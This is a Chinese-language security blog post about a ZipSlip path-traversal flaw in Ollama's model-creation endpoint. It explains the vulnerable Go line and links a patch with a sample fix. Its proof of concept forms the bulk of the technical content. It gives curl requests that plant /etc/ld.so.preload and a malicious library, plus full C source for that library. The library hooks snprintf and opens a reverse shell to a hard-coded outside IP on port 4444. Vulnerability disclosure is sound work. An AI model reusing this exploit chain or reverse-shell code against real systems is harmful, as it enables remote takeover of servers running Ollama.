---
title: Ollama zipslip 远程代码执行漏洞
url: https://mp.weixin.qq.com/s?__biz=MzU0MzkzOTYzOQ==&mid=2247489640&idx=1&sn=e57ea32bd4a7e9114628507c2d6e8d87&chksm=fb029530cc751c263986fd9ab93607d64eb1341f2b764780f3f5f69306e7b32e29f5b645bd47&scene=58&subscene=0#rd
source: 黑伞安全
date: 2025-02-15
fetch_date: 2025-10-06T21:55:28.869514
---

# Ollama zipslip 远程代码执行漏洞

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/ZS0VQrDMfGpSyGia2ooqObI1u7tUgeD8nQZA2uR7PNe5HLggVFYIW3ich4JRW6ia6atXkoMJfmkdw9oLQBkDfPiabw/0?wx_fmt=jpeg)

# Ollama zipslip 远程代码执行漏洞

原创

枇杷哥

黑伞安全

# 通过ollama/ollama中的 zipslip 执行远程代码

## 概括

该ZipSlip漏洞可能允许攻击者将任意文件写入文件系统。因此，攻击者可以通过创建恶意 zip 文件 ( ) 来实现远程代码执行 ( /etc/ld.so.preloadRCE vuln.so) application/zip。

## 描述

ZipSlip 漏洞发生在main/server/model.go(parseFromZipFile)中。

```
outfile, err := os.Create(filepath.Join(tempdir, f.Name))
```

上述代码在解压压缩文件时，并未检查文件名是否包含../，因此存在路径遍历问题，文件可能会被写入整个文件系统。包含 的 zip 文件示例../ 请参考https://github.com/snyk/zip-slip-vulnerability/tree/master/archives。

## POC

PoC`/tmp/vuln.so`通过 ZipSlip 创建`/etc/ld.so.preload`以达到 Reverse Shell的过程。 流程如下：

触发 ZipSlip（/tmp/poc.zip 是 bad Zip）

```
curl -X POST http://localhost:11434/api/create -H "Content-Type: application/json" -d
'{"name":"maria","modelfile":"FROM /tmp/poc.zip\nSYSTEM DUMMY"}'
```

步骤 1 完成后，文件将被解压并`/tmp/vuln.so`创建`/etc/ld.so.preload`文件。创建文件后，`/tmp/vuln.so`将链接到 ollama 共享库。

触发反弹 Shell (RCE)

```
curl -X POST http://localhost:11434/api/chat -H "Content-Type: application/json" -d
'{"model":"moondream","messages":[]}'
```

调用/api/chat并诱导调用链接的恶意库，恶意库代码如下。

```
//gcc -shared -o vuln.so -fPIC poc.c
#include<stdio.h>
#include<unistd.h>
#include<stdarg.h>
#include<dlfcn.h>
#include<stdlib.h>
#include<arpa/inet.h>
#include<sys/socket.h>
#include<netinet/in.h>
#define REMOTE_ADDR "3.147.74.40"
#define REMOTE_PORT 4444
int shell(){
int sock;
struct sockaddr_in serv_addr;
    sock = socket(AF_INET, SOCK_STREAM,0);
if(sock ==-1){
        perror("socket");
exit(EXIT_FAILURE);
}
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    serv_addr.sin_port = htons(REMOTE_PORT);
if(connect(sock,(struct sockaddr *)&serv_addr,sizeof(serv_addr))==-1){
        perror("connect");
        close(sock);
exit(EXIT_FAILURE);
}
    dup2(sock,0);
    dup2(sock,1);
    dup2(sock,2);
    execve("/bin/bash", NULL, NULL);
    close(sock);
return0;}
// hooked snprintf
int snprintf(char*buffer,size_t n,constchar*format,...){
    printf("snprintf hooking!\n");
    shell();
return0;
}
```

## 影响

远程代码执行（RCE）

当将其他第三方程序与 ollama 一起使用时，可能会出现提供文件上传的情况。（例如，web-ui）或者，如果在 ollama 生态系统中与模型文件一起提供了恶意 bin 文件（application/zip），则可能会出现未指定数量的 RCE 受害者。

补丁链接 http://github.com/ollama/ollama/commit/123a722a6f541e300bc8e34297ac378ebe23f527

### 修复内容

补丁主要对文件路径的处理逻辑进行了改进，确保路径被严格校验，防止恶意路径的注入。以下是修复的核心代码思路：

```
- func resolvePath(userInput string) string {
-     return filepath.Join("/safe/base/dir", userInput)
- }
+ func resolvePath(userInput string) (string, error) {
+     resolvedPath := filepath.Join("/safe/base/dir", userInput)
+     if !strings.HasPrefix(resolvedPath, "/safe/base/dir") {
+         return "", fmt.Errorf("invalid path: %s", userInput)
+     }
+     return resolvedPath, nil
+ }
```

### 关注我们，获取更多安全资讯和技术分析！

微信公众号: 黑伞安全

如果你是一个长期主义者，欢迎加入我的知识星球,我们一起冲，一起学。2025 年春节推出内部云安全课程，后续涨价 159 元。每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款。

![图片](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGpcY6gfCIxenk0q7P2HTb6zldNBBUcicPWcznpg5HxMcbvvWF5aAFj3sPJC7yYI5PUibHib7Vo9xWCicw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

预览时标签不可点

修改于

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGr18k2OX2bpFFOefrkkbBpD4vsBhoQarpxbyLrL6uPXZicsFclqF0MRchuR2BqurUicZl69eOTW2wvw/0?wx_fmt=png)

黑伞安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGr18k2OX2bpFFOefrkkbBpD4vsBhoQarpxbyLrL6uPXZicsFclqF0MRchuR2BqurUicZl69eOTW2wvw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过